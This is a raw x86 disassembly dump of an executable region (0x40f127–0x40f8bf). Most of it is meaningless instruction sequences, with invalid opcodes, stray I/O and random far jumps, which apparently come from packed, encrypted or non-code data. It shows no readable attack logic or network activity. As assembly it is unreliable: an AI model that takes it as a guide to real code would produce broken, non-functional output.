  40f127:	lds    edi,FWORD PTR [ecx+0x3ebc6126]
  40f12d:	test   DWORD PTR [esi],0x5fdd6c26
  40f133:	jecxz  0x40f197
  40f135:	shr    BYTE PTR [ecx-0x4a6bb8d1],cl
  40f13b:	push   0x6884bdcd
  40f140:	xlat   BYTE PTR ds:[ebx]
  40f141:	push   edi
  40f142:	inc    ebx
  40f143:	out    dx,eax
  40f144:	clc    
  40f145:	push   ss
  40f146:	push   esi
  40f147:	pop    ecx
  40f148:	call   0x66af8306
  40f14d:	adc    BYTE PTR [eax-0x3b],ah
  40f150:	out    0x9c,eax
  40f152:	pop    ebx
  40f153:	fsub   QWORD PTR [ebp-0x10]
  40f156:	fist   WORD PTR [esi]
  40f158:	jmp    0x40f1bf
  40f15a:	aas    
  40f15b:	mov    ebp,0x4758ab00
  40f160:	rcr    DWORD PTR [esi+0x18],0x21
  40f164:	push   0xab6d4652
  40f169:	xor    BYTE PTR [ebx+0x12],ah
  40f16c:	lods   al,BYTE PTR ds:[esi]
  40f16d:	push   0x22
  40f16f:	sbb    BYTE PTR [ebx+ebp*4],bl
  40f172:	dec    edi
  40f173:	ffree  st(0)
  40f175:	test   BYTE PTR [edx+0x426a345d],ah
  40f17b:	xchg   ecx,eax
  40f17c:	sub    al,0x5c
  40f17e:	xchg   ecx,eax
  40f17f:	icebp  
  40f180:	in     eax,dx
  40f181:	pop    edx
  40f182:	lds    ecx,FWORD PTR [ebx]
  40f184:	adc    cl,bh
  40f186:	scas   eax,DWORD PTR es:[edi]
  40f187:	ins    BYTE PTR es:[edi],dx
  40f188:	test   al,0x22
  40f18a:	mov    edi,0xa6309260
  40f18f:	sbb    eax,0x20e8afd3
  40f194:	inc    ebp
  40f195:	lods   eax,DWORD PTR ds:[esi]
  40f196:	mov    al,0xa2
  40f198:	jl     0x40f138
  40f19a:	aam    0xc8
  40f19c:	add    esp,DWORD PTR [ebx-0x35552c73]
  40f1a2:	sbb    ebp,DWORD PTR [ebx]
  40f1a4:	fst    QWORD PTR [ebp-0x71]
  40f1a7:	inc    edi
  40f1a8:	pop    ebx
  40f1a9:	ror    esp,cl
  40f1ab:	pop    sp
  40f1ad:	(bad)  
  40f1ae:	aad    0x85
  40f1b0:	push   0x425322a3
  40f1b5:	js     0x40f209
  40f1b7:	or     dh,al
  40f1b9:	push   0x7db5e5f6
  40f1be:	cmp    DWORD PTR [ebx-0x31384f0e],0x1d
  40f1c5:	inc    edi
  40f1c6:	or     al,0x5d
  40f1c8:	dec    edi
  40f1c9:	loope  0x40f1de
  40f1cb:	fs sub bl,bl
  40f1ce:	and    edi,DWORD PTR [esi-0x2dd4a4c3]
  40f1d4:	or     BYTE PTR [edx+0x5bd7bb97],bh
  40f1da:	daa    
  40f1db:	fadd   DWORD PTR [eax+0x5e]
  40f1de:	xlat   BYTE PTR ds:[ebx]
  40f1df:	in     al,0x61
  40f1e1:	mov    dh,0xb7
  40f1e3:	cmp    eax,0xdcb31302
  40f1e8:	test   eax,0x674e097a
  40f1ed:	test   eax,0xf26e3eac
  40f1f2:	retf   0xc944
  40f1f5:	pop    ebx
  40f1f6:	shr    ebx,0xe
  40f1f9:	mov    dl,0x6c
  40f1fb:	retf   0xbd42
  40f1fe:	or     eax,0x889ae5fe
  40f203:	xchg   ecx,eax
  40f204:	fstp   DWORD PTR [ebx]
  40f206:	push   ds
  40f207:	fnstsw WORD PTR [edi]
  40f209:	push   ebx
  40f20a:	sub    esi,ebx
  40f20c:	mov    cs,ebp
  40f20e:	jmp    0x40f1cd
  40f210:	ja     0x40f259
  40f212:	xor    ch,BYTE PTR [ebx]
  40f214:	add    ah,BYTE PTR [ebx-0x37]
  40f217:	mov    cl,0x9a
  40f219:	data16 cli 
  40f21b:	fsubr  st(2),st
  40f21d:	inc    ebp
  40f21e:	rcl    ecx,0x3
  40f221:	fisub  WORD PTR [ebx]
  40f223:	add    BYTE PTR [ebx],bh
  40f225:	jne    0x40f2a3
  40f227:	dec    ebx
  40f228:	leave  
  40f229:	push   ds
  40f22a:	xor    eax,DWORD PTR [ebp+0x5e0e889]
  40f230:	mov    bh,0x61
  40f232:	clc    
  40f233:	mov    al,0xcd
  40f235:	mov    ecx,eax
  40f237:	adc    eax,0x6055d2b2
  40f23c:	push   ds
  40f23d:	cmp    dh,bl
  40f23f:	pusha  
  40f240:	inc    edi
  40f241:	ret    
  40f242:	jns    0x40f1d3
  40f244:	fwait
  40f245:	cmc    
  40f246:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f247:	fld    DWORD PTR [ebx+0x13]
  40f24a:	or     DWORD PTR [eax+0x3275c91a],esp
  40f250:	mov    cl,0x9f
  40f252:	adc    al,0x56
  40f254:	mov    eax,ds:0x52e40433
  40f259:	icebp  
  40f25a:	cmp    bh,0x75
  40f25d:	clc    
  40f25e:	push   DWORD PTR [ebp-0x4]
  40f261:	call   0x40937f
  40f266:	mov    eax,DWORD PTR [ebp-0x4]
  40f269:	xor    eax,edi
  40f26b:	pop    edi
  40f26c:	add    eax,esi
  40f26e:	jmp    0x40f634
  40f273:	xchg   ecx,eax
  40f274:	pushf  
  40f275:	out    0xec,al
  40f277:	icebp  
  40f278:	jbe    0x40f20b
  40f27a:	popa   
  40f27b:	out    dx,eax
  40f27c:	bound  ecx,QWORD PTR [edx-0x6c6e0327]
  40f282:	lea    esp,[ecx-0x56]
  40f285:	jl     0x40f303
  40f287:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f288:	jns    0x40f306
  40f28a:	jl     0x40f241
  40f28c:	adc    DWORD PTR [ebx+0x61],ecx
  40f28f:	lds    edi,FWORD PTR [edi-0x598f7061]
  40f295:	mov    ?,WORD PTR [edx-0x2f]
  40f298:	mov    eax,DWORD PTR [ecx+0x5c]
  40f29b:	cmp    BYTE PTR [ebp-0x643aab96],dh
  40f2a1:	pop    esi
  40f2a2:	aad    0xb9
  40f2a4:	mov    ?,WORD PTR [edx+0x1ba47de4]
  40f2aa:	cld    
  40f2ab:	xor    BYTE PTR [ebp+0x7869ab02],dl
  40f2b1:	adc    al,0x44
  40f2b3:	xchg   ebx,eax
  40f2b4:	or     DWORD PTR [edi-0x3a],eax
  40f2b7:	xchg   BYTE PTR [edi+0x10],bh
  40f2ba:	ror    DWORD PTR [edx-0x25b817be],0xcc
  40f2c1:	or     eax,0x34c52f22
  40f2c6:	push   ebp
  40f2c7:	xor    esp,esp
  40f2c9:	push   es
  40f2ca:	(bad)  
  40f2cb:	pop    ebx
  40f2cc:	outs   dx,BYTE PTR ds:[esi]
  40f2cd:	hlt    
  40f2ce:	stos   DWORD PTR es:[edi],eax
  40f2cf:	dec    esp
  40f2d0:	pop    edx
  40f2d1:	into   
  40f2d2:	scas   al,BYTE PTR es:[edi]
  40f2d3:	jnp    0x40f2b6
  40f2d5:	rol    DWORD PTR [ebp-0x7c3a126c],1
  40f2db:	sbb    ebp,DWORD PTR [edi]
  40f2dd:	add    DWORD PTR [edx+0x26428079],edi
  40f2e3:	(bad)  
  40f2e4:	mov    ebx,0xeaea8443
  40f2e9:	mov    DWORD PTR [ebx+0x3da130c2],edx
  40f2ef:	pusha  
  40f2f0:	pop    esp
  40f2f1:	rol    al,0x69
  40f2f4:	aam    0x39
  40f2f6:	jno    0x40f30a
  40f2f8:	ja     0x40f304
  40f2fa:	inc    edi
  40f2fb:	aam    0x78
  40f2fd:	data16 cli 
  40f2ff:	sub    al,0xc7
  40f301:	rol    DWORD PTR [ebx],0xb1
  40f304:	mov    esi,fs
  40f306:	xchg   esp,eax
  40f307:	sbb    eax,0x106d01be
  40f30c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f30d:	mov    ds:0xf4da0100,eax
  40f312:	inc    ebp
  40f313:	mov    ah,0x29
  40f315:	cwde   
  40f316:	stos   BYTE PTR es:[edi],al
  40f317:	test   bh,dl
  40f319:	les    edx,FWORD PTR [eax-0xaa5628e]
  40f31f:	jb     0x40f343
  40f321:	pop    ds
  40f322:	(bad)  
  40f323:	dec    ebp
  40f324:	idiv   BYTE PTR [ebx+0x5e93f31]
  40f32a:	jl     0x40f32f
  40f32c:	dec    ebp
  40f32d:	mov    DWORD PTR [esi+0x70a99fb7],edx
  40f333:	mov    ah,0x25
  40f335:	aad    0x1f
  40f337:	push   esi
  40f338:	jns    0x40f36f
  40f33a:	pop    es
  40f33b:	sub    bl,BYTE PTR [edi+0x6d51494b]
  40f341:	(bad)  [eax]
  40f343:	xchg   ebp,eax
  40f344:	and    bh,BYTE PTR [ebp-0x2d]
  40f347:	lahf   
  40f348:	fcmovnbe st,st(0)
  40f34a:	xchg   edi,eax
  40f34b:	sub    ah,BYTE PTR [edx]
  40f34d:	cmp    eax,0x6eba364c
  40f352:	pop    DWORD PTR [ebx-0x64]
  40f355:	stos   DWORD PTR es:[edi],eax
  40f356:	push   edx
  40f357:	cmovns edx,DWORD PTR [eax+0x11]
  40f35b:	sbb    dh,bh
  40f35d:	cmp    DWORD PTR [edx+0xd035f6d],eax
  40f363:	inc    esi
  40f364:	outs   dx,BYTE PTR ds:[esi]
  40f365:	pop    ebx
  40f366:	ret    0xc804
  40f369:	jl     0x40f3c3
  40f36b:	nop
  40f36c:	cld    
  40f36d:	fcmovbe st,st(2)
  40f36f:	nop
  40f370:	stos   BYTE PTR es:[edi],al
  40f371:	mov    edi,0xc6697109
  40f376:	(bad)  
  40f377:	call   0xe9aaf8d7
  40f37c:	sahf   
  40f37d:	add    BYTE PTR [ebx],ah
  40f37f:	retf   
  40f380:	xor    bh,BYTE PTR [ebp+0xb977039]
  40f386:	push   ecx
  40f387:	cmp    BYTE PTR [esi],dh
  40f389:	or     esp,DWORD PTR [ebx+0x41]
  40f38c:	mov    al,0x5f
  40f38e:	das    
  40f38f:	dec    ebp
  40f390:	cs lahf 
  40f392:	into   
  40f393:	inc    esi
  40f394:	mov    dl,0x5b
  40f396:	test   BYTE PTR [eax-0x57fb7e34],al
  40f39c:	push   esp
  40f39d:	cmp    edx,DWORD PTR [esp+ebx*1+0x42]
  40f3a1:	jecxz  0x40f342
  40f3a3:	test   DWORD PTR [edi-0x2d45f73d],0xbe1ab6dd
  40f3ad:	mov    bl,0x18
  40f3af:	inc    esp
  40f3b0:	mov    esi,0x2622c7b9
  40f3b5:	cld    
  40f3b6:	pop    ds
  40f3b7:	aas    
  40f3b8:	(bad)  
  40f3b9:	xorps  xmm7,XMMWORD PTR [edi-0x27]
  40f3bd:	or     BYTE PTR [edx-0x1b],ah
  40f3c0:	mov    al,ds:0x314fafd
  40f3c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3c6:	push   ecx
  40f3c7:	or     al,0x93
  40f3c9:	xor    eax,0x273de910
  40f3ce:	fistp  QWORD PTR gs:[ecx-0x3b]
  40f3d2:	push   eax
  40f3d3:	push   0xffffffd1
  40f3d5:	pop    ebp
  40f3d6:	jnp    0x40f41f
  40f3d8:	jle    0x40f3b0
  40f3da:	mov    BYTE PTR [edi+0x44],0x4
  40f3de:	icebp  
  40f3df:	push   ebp
  40f3e0:	ja     0x40f450
  40f3e2:	les    eax,FWORD PTR [ecx+0x59]
  40f3e5:	scas   al,BYTE PTR es:[edi]
  40f3e6:	jecxz  0x40f3aa
  40f3e8:	xor    eax,0x68a26937
  40f3ed:	in     al,dx
  40f3ee:	loope  0x40f440
  40f3f0:	push   cs
  40f3f1:	cmp    DWORD PTR [ebp-0x7c],esi
  40f3f4:	push   ebp
  40f3f5:	mov    ds:0xbbaeb555,al
  40f3fa:	repnz aas 
  40f3fc:	test   al,0xf
  40f3fe:	sahf   
  40f3ff:	out    dx,al
  40f400:	push   edx
  40f401:	mov    dl,0xf3
  40f403:	cmp    eax,0xe6de915e
  40f408:	mov    ch,0x7a
  40f40a:	popa   
  40f40b:	sbb    al,0x4a
  40f40d:	outs   dx,BYTE PTR fs:[esi]
  40f40f:	push   ebp
  40f410:	dec    edi
  40f411:	pop    ss
  40f412:	xor    BYTE PTR [edi-0x6fc7a87c],ah
  40f418:	push   ecx
  40f419:	stos   BYTE PTR es:[edi],al
  40f41a:	push   edx
  40f41b:	shl    DWORD PTR [ecx-0x34],1
  40f41e:	jmp    0x4203:0x2ffb1aa4
  40f425:	sti    
  40f426:	sub    esi,ebx
  40f428:	fidivr WORD PTR [ecx]
  40f42a:	dec    ecx
  40f42b:	ret    
  40f42c:	les    ebx,FWORD PTR [edi+0x4]
  40f42f:	xlat   BYTE PTR ds:[ebx]
  40f430:	js     0x40f49b
  40f432:	(bad)
  40f435:	dec    esp
  40f436:	mov    ch,0xaa
  40f438:	xchg   BYTE PTR [ebp+0x52554181],cl
  40f43e:	ficomp DWORD PTR [esi-0x669cc673]
  40f444:	push   0x43389b48
  40f449:	mov    bl,BYTE PTR [eax+0x29]
  40f44c:	inc    edi
  40f44d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f44e:	mov    edx,DWORD PTR [edx+esi*1+0x44eb0d10]
  40f455:	gs popf 
  40f457:	push   ebx
  40f458:	dec    esp
  40f459:	sub    bl,bh
  40f45b:	add    al,0xd0
  40f45d:	and    BYTE PTR [esi+eiz*2-0x64],dl
  40f461:	add    DWORD PTR [ebx-0x15],ebx
  40f464:	sub    al,0xea
  40f466:	jno    0x40f44b
  40f468:	mov    dl,0x4
  40f46a:	lds    esp,FWORD PTR [ecx+0x2031b140]
  40f470:	mov    edi,0xf5671ea2
  40f475:	rcr    BYTE PTR [eax-0x703bec6c],1
  40f47b:	mov    ebx,0xc02dbad3
  40f480:	or     esi,DWORD PTR [edi-0x4a3f2fc1]
  40f486:	out    0x3f,eax
  40f488:	in     eax,0x17
  40f48a:	cmp    ebx,0x5883dc18
  40f490:	lock imul ebx,DWORD PTR [edx+0xc],0xbd77bd49
  40f498:	and    edx,ecx
  40f49a:	xchg   ecx,eax
  40f49b:	add    eax,0x2ce4e90a
  40f4a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f4a1:	inc    eax
  40f4a2:	sbb    al,0xe8
  40f4a4:	push   edx
  40f4a5:	(bad)  [ecx+0xe]
  40f4a8:	adc    dl,BYTE PTR [ebp+0x6c]
  40f4ab:	xchg   dl,ch
  40f4ad:	mov    al,0x7f
  40f4af:	hlt    
  40f4b0:	jns    0x40f52f
  40f4b2:	(bad)  
  40f4b3:	in     al,0xfb
  40f4b5:	(bad)  
  40f4b6:	jmp    0x40f49d
  40f4b8:	xchg   esp,eax
  40f4b9:	mov    ecx,0x41677c12
  40f4be:	cli    
  40f4bf:	ja     0x40f496
  40f4c1:	bound  eax,QWORD PTR [edx-0x629d6e69]
  40f4c7:	or     al,0x99
  40f4c9:	out    dx,eax
  40f4ca:	std    
  40f4cb:	sar    BYTE PTR [ecx-0x28],cl
  40f4ce:	inc    ebp
  40f4cf:	bswap  edi
  40f4d1:	sbb    edi,ecx
  40f4d3:	fmul   DWORD PTR [ecx-0x178ce52d]
  40f4d9:	pop    ecx
  40f4da:	out    0x3a,eax
  40f4dc:	push   ebp
  40f4dd:	out    dx,eax
  40f4de:	and    al,0x94
  40f4e0:	mov    esi,eax
  40f4e2:	sbb    eax,0xe47623d3
  40f4e7:	push   cs
  40f4e8:	(bad)  
  40f4eb:	int    0x4e
  40f4ed:	xchg   edx,eax
  40f4ee:	jecxz  0x40f549
  40f4f0:	and    DWORD PTR [ebp+0x10cdbeae],esi
  40f4f6:	xchg   edx,eax
  40f4f7:	adc    ebx,DWORD PTR [edx+0x52]
  40f4fa:	add    DWORD PTR [eax+0x1d],ebx
  40f4fd:	and    DWORD PTR [edx+0x15127008],0x26
  40f504:	pop    esi
  40f505:	arpl   WORD PTR [esi-0x22a0b16a],sp
  40f50b:	or     edx,DWORD PTR [eax-0x21afb19d]
  40f511:	scas   al,BYTE PTR es:[edi]
  40f512:	jbe    0x40f512
  40f514:	int3   
  40f515:	mov    eax,ds:0xcc219b01
  40f51a:	fist   DWORD PTR [bx+si+0x66]
  40f51e:	shl    DWORD PTR [edx],1
  40f520:	cmp    eax,0xdd9a5012
  40f525:	nop
  40f526:	push   ecx
  40f527:	fwait
  40f528:	xchg   DWORD PTR [ecx-0x2a4a886d],ebp
  40f52e:	xchg   BYTE PTR ds:0x2230e0dc,dl
  40f534:	retf   0x7d8f
  40f537:	imul   BYTE PTR [edx+0x16]
  40f53a:	mov    edi,0x710eba2f
  40f53f:	mov    BYTE PTR [edx+0x5d],al
  40f542:	add    al,0xda
  40f544:	leave  
  40f545:	aaa    
  40f546:	pop    esi
  40f547:	loop   0x40f5b8
  40f549:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  40f54b:	out    dx,eax
  40f54c:	push   esp
  40f54d:	mov    ebp,0x37043c58
  40f552:	ja     0x40f520
  40f554:	push   edi
  40f555:	jg     0x40f51c
  40f557:	pop    edx
  40f558:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f559:	addr16 jne 0x40f539
  40f55c:	xchg   ebp,eax
  40f55d:	jo     0x40f56f
  40f55f:	sbb    eax,DWORD PTR [esi-0x51]
  40f562:	adc    esi,edx
  40f564:	jno    0x40f58c
  40f566:	or     edi,DWORD PTR [edi]
  40f568:	out    0xb6,eax
  40f56a:	in     ax,0x69
  40f56d:	adc    eax,0xaef658d5
  40f572:	lods   al,BYTE PTR ds:[esi]
  40f573:	or     bh,ah
  40f575:	dec    esi
  40f576:	sti    
  40f577:	aad    0xa4
  40f579:	pushf  
  40f57a:	jno    0x40f532
  40f57c:	in     eax,dx
  40f57d:	cmp    DWORD PTR [ebx],ecx
  40f57f:	fisub  DWORD PTR [ebx+0x6a]
  40f582:	mov    bl,0x69
  40f584:	mov    bl,0xd2
  40f586:	add    ecx,ebp
  40f588:	pop    ebx
  40f589:	inc    eax
  40f58a:	dec    edx
  40f58b:	repz and DWORD PTR [eax-0x56],0xdc25bd3f
  40f593:	inc    edx
  40f594:	popf   
  40f595:	cdq    
  40f596:	inc    edi
  40f597:	and    BYTE PTR [eax-0x2aa51a3f],al
  40f59d:	fcom   DWORD PTR [ecx+0x32]
  40f5a0:	ins    DWORD PTR es:[edi],dx
  40f5a1:	cmp    eax,ebp
  40f5a3:	call   0x1154:0x611143ec
  40f5aa:	cmp    BYTE PTR [esi-0x38],dh
  40f5ad:	aam    0xcf
  40f5af:	pop    ebx
  40f5b0:	ret    0x4bf4
  40f5b3:	push   edi
  40f5b4:	bound  esi,QWORD PTR [edx]
  40f5b6:	pop    esp
  40f5b7:	hlt    
  40f5b8:	imul   ecx,DWORD PTR [edx+0x6709fc54],0x6b813d6a
  40f5c2:	adc    eax,0xa3598cd5
  40f5c7:	test   BYTE PTR [eax],ah
  40f5c9:	je     0x40f60f
  40f5cb:	xor    ah,bh
  40f5cd:	xor    bl,BYTE PTR [edi+0x31c09dd6]
  40f5d3:	popa   
  40f5d4:	add    al,0x9b
  40f5d6:	iret   
  40f5d7:	popf   
  40f5d8:	or     BYTE PTR [edi-0x40a9f911],bh
  40f5de:	inc    ebx
  40f5df:	shl    DWORD PTR [edi+0x63],cl
  40f5e2:	sti    
  40f5e3:	adc    bh,bh
  40f5e5:	es mov edx,0x40c141d8
  40f5eb:	pusha  
  40f5ec:	pop    ds
  40f5ed:	sbb    esi,DWORD PTR [ecx]
  40f5ef:	imul   ecx,DWORD PTR [eax+ebx*4],0xffffff87
  40f5f3:	and    BYTE PTR ds:0x5e27a3ec,0xe7
  40f5fa:	fdiv   QWORD PTR [esi+0x31dd36ec]
  40f600:	inc    ecx
  40f601:	and    DWORD PTR [eax+0x12f48113],esi
  40f607:	sub    eax,0xf10d1825
  40f60c:	js     0x40f5bc
  40f60e:	or     BYTE PTR es:[edi],ah
  40f611:	and    cx,sp
  40f614:	or     BYTE PTR [ecx+0x20],bl
  40f617:	call   0x275c:0x300712b0
  40f61e:	fistp  DWORD PTR [esp+ebx*4-0x41872806]
  40f625:	xchg   ebp,eax
  40f626:	push   ebx
  40f627:	aas    
  40f628:	rol    DWORD PTR [eax+0x3da79ab2],1
  40f62e:	jl     0x40f5ca
  40f630:	push   ecx
  40f631:	jl     0x40f683
  40f633:	xchg   esp,eax
  40f634:	pop    esi
  40f635:	leave  
  40f636:	ret    0xc
  40f639:	push   ebp
  40f63a:	mov    ebp,esp
  40f63c:	push   ecx
  40f63d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40f644:	mov    eax,DWORD PTR [ebp+0x8]
  40f647:	sbb    DWORD PTR ds:0x4336ef,0x1bf0
  40f651:	mov    al,BYTE PTR [eax]
  40f653:	and    DWORD PTR ds:0x4336df,0x4336a3
  40f65d:	jmp    0x40f925
  40f662:	pop    es
  40f663:	sbb    DWORD PTR [edx],ebp
  40f665:	pop    ecx
  40f666:	xor    dh,BYTE PTR [ebp+0x53]
  40f669:	popa   
  40f66a:	inc    eax
  40f66b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f66c:	push   esi
  40f66d:	call   0xb688:0x904bb96c
  40f674:	jl     0x40f6f2
  40f676:	mov    eax,ds:0xa7c7c7e
  40f67b:	retf   0xf64a
  40f67e:	test   eax,0x630488de
  40f683:	dec    edi
  40f684:	(bad)  
  40f685:	std    
  40f686:	or     eax,0xbde28344
  40f68b:	jae    0x40f6ae
  40f68d:	loop   0x40f6a8
  40f68f:	(bad)  
  40f690:	sti    
  40f691:	jl     0x40f681
  40f693:	cld    
  40f694:	add    dl,BYTE PTR [esi+0x3b]
  40f697:	or     DWORD PTR [edx-0x3fa027a0],edi
  40f69d:	jo     0x40f64a
  40f69f:	fst    QWORD PTR [eax-0x1a]
  40f6a2:	ret    0x55a3
  40f6a5:	js     0x40f674
  40f6a7:	mov    BYTE PTR [edi],bl
  40f6a9:	fs jg  0x40f66e
  40f6ac:	mov    eax,ds:0x12b0722c
  40f6b1:	and    bh,dl
  40f6b3:	add    ebp,DWORD PTR [ebp-0x5d02ba02]
  40f6b9:	arpl   WORD PTR ds:0x6c8397ed,dx
  40f6bf:	mov    cl,0xde
  40f6c1:	pop    ss
  40f6c2:	inc    ebx
  40f6c3:	jge    0x40f707
  40f6c5:	int3   
  40f6c6:	mov    al,0xb
  40f6c8:	ins    DWORD PTR es:[edi],dx
  40f6c9:	out    0x49,al
  40f6cb:	adc    al,BYTE PTR [ebp+0x42a25f0a]
  40f6d1:	mov    bh,cl
  40f6d3:	ret    
  40f6d4:	pop    edx
  40f6d5:	loop   0x40f6cc
  40f6d7:	and    eax,0xd909c9e2
  40f6dc:	enter  0x18b0,0x57
  40f6e0:	jle    0x40f6ed
  40f6e2:	add    eax,0xbc7956be
  40f6e7:	ror    BYTE PTR [eax-0x3d575d6c],1
  40f6ed:	sub    eax,DWORD PTR [edx]
  40f6ef:	mov    ds:0xe7196ed4,eax
  40f6f4:	jae    0x40f679
  40f6f6:	dec    edi
  40f6f7:	fidivr WORD PTR [edi]
  40f6f9:	adc    esi,DWORD PTR [ecx+0x76c9664d]
  40f6ff:	out    dx,al
  40f700:	rcl    al,0x8d
  40f703:	xlat   BYTE PTR ds:[ebx]
  40f704:	mov    dl,BYTE PTR [eax]
  40f706:	pusha  
  40f707:	adc    eax,0x54e737ec
  40f70c:	popf   
  40f70d:	fs jge 0x40f6d8
  40f710:	icebp  
  40f711:	xor    BYTE PTR [eax+0xa2f3d9b],cl
  40f717:	pop    ss
  40f718:	scas   al,BYTE PTR es:[edi]
  40f719:	or     DWORD PTR [eax+0x4404a703],edx
  40f71f:	stos   DWORD PTR es:[edi],eax
  40f720:	das    
  40f721:	adc    DWORD PTR [esi-0x40dce314],eax
  40f727:	mov    edi,ebx
  40f729:	aam    0x89
  40f72b:	or     ch,BYTE PTR [edx]
  40f72d:	int    0x85
  40f72f:	xchg   esi,eax
  40f730:	and    al,0x6a
  40f732:	daa    
  40f733:	xchg   edx,eax
  40f734:	lods   eax,DWORD PTR ds:[esi]
  40f735:	rep lods al,BYTE PTR ds:[esi]
  40f737:	shr    BYTE PTR [esi],1
  40f739:	mov    ds:0x5f82e805,al
  40f73e:	outs   dx,DWORD PTR ds:[esi]
  40f73f:	pushf  
  40f740:	and    DWORD PTR [edx-0x766ab7d5],edi
  40f746:	jp     0x40f79e
  40f748:	xchg   DWORD PTR [ebx],ecx
  40f74a:	test   eax,0x1484c112
  40f74f:	mov    al,ds:0xea0976bc
  40f754:	add    BYTE PTR [ecx-0x80],0x4b
  40f758:	inc    eax
  40f759:	pop    ebx
  40f75a:	popa   
  40f75b:	das    
  40f75c:	push   0xdab5a5a0
  40f761:	ror    BYTE PTR [ebx+0x19718ee8],cl
  40f767:	adc    DWORD PTR ds:0x19d3818b,esp
  40f76d:	scas   al,BYTE PTR es:[edi]
  40f76e:	shl    dl,1
  40f770:	into   
  40f771:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f772:	aad    0xed
  40f774:	sbb    al,0xe4
  40f776:	aam    0x7c
  40f778:	push   ecx
  40f779:	push   es
  40f77a:	xor    BYTE PTR [edi+0x535fc657],cl
  40f780:	mov    WORD PTR [ecx+edx*2+0x445003be],fs
  40f787:	(bad)  
  40f788:	dec    ebp
  40f789:	in     al,dx
  40f78a:	cmc    
  40f78b:	or     eax,0x2a9142e4
  40f790:	in     eax,0x12
  40f792:	lods   al,BYTE PTR ds:[esi]
  40f793:	push   ebx
  40f794:	pop    ss
  40f795:	push   eax
  40f796:	push   edx
  40f797:	lds    edi,FWORD PTR [edx]
  40f799:	xor    eax,0xb0b472dd
  40f79e:	xor    DWORD PTR [ebx+0xb16821],edx
  40f7a4:	sub    eax,0x26523eff
  40f7a9:	fcom   QWORD PTR [ebp+0x792a986]
  40f7af:	les    esi,FWORD PTR [esi-0x1606a1e8]
  40f7b5:	xchg   esi,eax
  40f7b6:	adc    dl,BYTE PTR [edx+edi*1+0x4371aa7f]
  40f7bd:	and    eax,0x1b11031a
  40f7c2:	lea    ebx,[ecx]
  40f7c4:	hlt    
  40f7c5:	add    eax,0x9e3fdc6d
  40f7ca:	cli    
  40f7cb:	sbb    DWORD PTR [esi],eax
  40f7cd:	jmp    0xf92d:0x39b80b70
  40f7d4:	jmp    0x399d:0xcf4290a3
  40f7db:	mov    esp,0xf589797
  40f7e0:	xor    al,bl
  40f7e2:	and    eax,0xe00dea05
  40f7e7:	scas   eax,DWORD PTR es:[edi]
  40f7e8:	mov    bh,0x3d
  40f7ea:	sub    BYTE PTR [ebx-0x3b],al
  40f7ed:	xchg   ebp,eax
  40f7ee:	and    cl,dl
  40f7f0:	add    ah,BYTE PTR [edi-0x71]
  40f7f3:	sahf   
  40f7f4:	retf   
  40f7f5:	iret   
  40f7f6:	pop    ecx
  40f7f7:	xor    eax,0xd27a7b15
  40f7fc:	loop   0x40f84f
  40f7fe:	adc    BYTE PTR [edi+0x6d],0x53
  40f802:	fs icebp 
  40f804:	outs   dx,BYTE PTR ds:[esi]
  40f805:	or     edi,DWORD PTR [edx+0x425e63eb]
  40f80b:	loop   0x40f83e
  40f80d:	rcr    BYTE PTR [esi-0xb],1
  40f810:	push   ds
  40f811:	rcr    bh,cl
  40f813:	mov    dl,0x4d
  40f815:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f816:	jo     0x40f869
  40f818:	rcl    BYTE PTR [ebx+eax*4+0x1c],0xa0
  40f81d:	data16 js 0x40f874
  40f820:	scas   al,BYTE PTR es:[edi]
  40f821:	mov    cl,0x64
  40f823:	(bad)  
  40f825:	inc    ebx
  40f826:	shl    ebx,1
  40f828:	jne    0x40f82e
  40f82a:	int    0x9b
  40f82c:	dec    esi
  40f82d:	stos   BYTE PTR es:[edi],al
  40f82e:	nop
  40f82f:	adc    cl,BYTE PTR [esi+edx*1+0x4a9fd69c]
  40f836:	cwde   
  40f837:	scas   al,BYTE PTR es:[edi]
  40f838:	shl    BYTE PTR [esp+edx*8+0x14],cl
  40f83c:	pop    ds
  40f83d:	sbb    DWORD PTR ds:0xd421676f,esp
  40f843:	pop    ss
  40f844:	sbb    BYTE PTR [esi+eiz*8-0x4d725517],ch
  40f84b:	ins    DWORD PTR es:[edi],dx
  40f84c:	push   edx
  40f84d:	push   eax
  40f84e:	in     eax,0x4d
  40f850:	es cmp eax,0x5c106de2
  40f856:	adc    ah,BYTE PTR [ecx-0x13f6a4db]
  40f85c:	lock cmp DWORD PTR [edi],ebx
  40f85f:	js     0x40f7ef
  40f861:	inc    ebp
  40f862:	retf   
  40f863:	sub    cl,BYTE PTR [eax-0x13277cbe]
  40f869:	push   0xffffffc3
  40f86b:	and    eax,0xb2da714e
  40f870:	in     al,0xc9
  40f872:	mov    edi,es
  40f874:	sub    al,0xe8
  40f877:	int3   
  40f878:	push   edi
  40f879:	adc    DWORD PTR [eax+0x5d],0x23858323
  40f880:	(bad)  
  40f881:	cmp    eax,0x12eba347
  40f886:	hlt    
  40f887:	in     al,0x16
  40f889:	mov    es,WORD PTR [edx+0x2f]
  40f88c:	mov    ebp,0x381a5a05
  40f891:	popa   
  40f892:	xchg   ebp,eax
  40f893:	mov    BYTE PTR ds:0xa1257d2e,ch
  40f899:	pop    ebx
  40f89a:	leave  
  40f89b:	es push 0xf5aca125
  40f8a1:	mov    DWORD PTR [edx+0x1739b940],esp
  40f8a7:	mov    dl,0x25
  40f8a9:	and    ebp,DWORD PTR [edi]
  40f8ab:	mov    cl,0x6b
  40f8ad:	popa   
  40f8ae:	xchg   edi,eax
  40f8af:	mov    al,ds:0xf6fbcd65
  40f8b4:	xor    DWORD PTR [edi-0xcfbd6e6],edx
  40f8ba:	ins    DWORD PTR es:[edi],dx
  40f8bb:	stos   DWORD PTR es:[edi],eax
  40f8bc:	xor    ah,BYTE PTR [eax-0x57]
  40f8bf:	push   esi
